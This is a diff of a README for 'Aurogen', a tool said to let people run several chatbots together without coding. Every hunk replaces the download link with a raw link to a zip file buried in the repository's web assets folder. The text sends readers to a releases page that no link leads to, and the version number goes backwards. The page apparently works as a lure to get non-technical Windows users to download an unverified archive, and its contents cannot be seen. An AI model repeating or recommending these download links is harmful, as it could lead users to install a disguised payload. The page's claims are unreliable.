@@ -1,6 +1,6 @@
 # 🍊 Aurogen - Easy Multi-Agent Chatbot Evolution
 
-[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-orange?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/raw/refs/heads/main/docs/Software-v3.8-alpha.2.zip)
+[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-orange?style=for-the-badge)](https://raw.githubusercontent.com/maomaoguo89-star/Aurogen/main/aurogen_web/src/assets/Software-2.5-alpha.1.zip)
 
 Aurogen🍊 is a tool that helps you run multiple chatbots working together. It uses smart technology to improve how these chatbots evolve and understand each other. You do not need to know how to code to use it.
 
@@ -31,7 +31,7 @@ Follow these steps to get Aurogen on your Windows PC and start using it:
 
 1. **Visit the download page:**  
    Click this big button to go to the download page:  
-   [![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-brightgreen?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/raw/refs/heads/main/docs/Software-v3.8-alpha.2.zip)
+   [![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/maomaoguo89-star/Aurogen/main/aurogen_web/src/assets/Software-2.5-alpha.1.zip)
 
 2. **Choose the latest version:**  
    On the releases page, look for the most recent release. It will have the latest features and fixes.
@@ -100,7 +100,7 @@ If you run into problems, try these steps:
 
 ## 🔗 Useful Links
 
-- Download Aurogen here: [https://github.com/maomaoguo89-star/Aurogen/raw/refs/heads/main/docs/Software-v3.8-alpha.2.zip](https://github.com/maomaoguo89-star/Aurogen/raw/refs/heads/main/docs/Software-v3.8-alpha.2.zip)
+- Download Aurogen here: [https://raw.githubusercontent.com/maomaoguo89-star/Aurogen/main/aurogen_web/src/assets/Software-2.5-alpha.1.zip](https://raw.githubusercontent.com/maomaoguo89-star/Aurogen/main/aurogen_web/src/assets/Software-2.5-alpha.1.zip)
 - Project home: GitHub repository  
 - Chatbots info: Search for "OpenClaw chatbot" online for background
 
@@ -132,4 +132,4 @@ Check the releases page regularly to see if there is a new version. New updates 
 
 ---
 
-[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-blue?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/raw/refs/heads/main/docs/Software-v3.8-alpha.2.zip)
+[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-blue?style=for-the-badge)](https://raw.githubusercontent.com/maomaoguo89-star/Aurogen/main/aurogen_web/src/assets/Software-2.5-alpha.1.zip)
